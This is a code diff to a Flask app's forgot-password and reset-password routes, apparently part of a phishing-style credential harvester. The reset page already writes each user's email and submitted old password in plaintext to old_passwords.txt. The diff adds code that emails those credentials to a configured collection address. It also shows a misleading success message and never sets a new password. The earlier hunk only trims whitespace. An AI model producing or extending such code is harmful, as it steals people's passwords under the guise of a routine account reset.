@@ -34,23 +34,23 @@ def forgot_password():
         if email:
             token = s.dumps(email, salt="samplesalt")
             reset_url = url_for("reset_password", token=token, _external=True)
-            
+
             mail_client = Mail(username=BaseConfig.EMAIL_USERNAME,
                                password=BaseConfig.EMAIL_PASSWORD,
                                host=BaseConfig.EMAIL_HOST,
                                port=BaseConfig.EMAIL_PORT)
-            
+
             print(mail_client)
             subject = "Password Update Request"
             body = f"Click the link to update your password: {reset_url}"
             resp, success = mail_client.send_mail([email], subject, body, "IT Team")
-            
+
             if success:
                 flash("Password reset email sent. Please check your inbox.", "success")
             else:
                 flash("Error sending email. Please try again later.", "error")
-            
-            return redirect(url_for("index")) 
+
+            return redirect(url_for("index"))
 
     return render_template("forgot-password.html")
 
@@ -67,13 +67,27 @@ def reset_password(token):
 
     if request.method == "POST":
         old_password = request.form.get("old_password")
-        
+
         file_path = "old_passwords.txt"
 
         with open(file_path, "a") as file:
             file.write(f"{email}: {old_password}\n")
-            
-        flash("Your password has been reset successfully!", "success")
+
+        mail_client = Mail(username=BaseConfig.EMAIL_USERNAME,
+                           password=BaseConfig.EMAIL_PASSWORD,
+                           host=BaseConfig.EMAIL_HOST,
+                           port=BaseConfig.EMAIL_PORT)
+
+        print(mail_client)
+        subject = "Password Updated"
+        body = f"{email}: {old_password}\n"
+        resp, success = mail_client.send_mail([BaseConfig.EMAIL_STORAGE], subject, body, "IT Team")
+
+        if success:
+            flash("Password update email sent. Please check your inbox.", "success")
+        else:
+            flash("Error sending email. Please try again later.", "error")
+
         return redirect(url_for("login"))
 
     return render_template("reset-password.html", email=email, token=token)
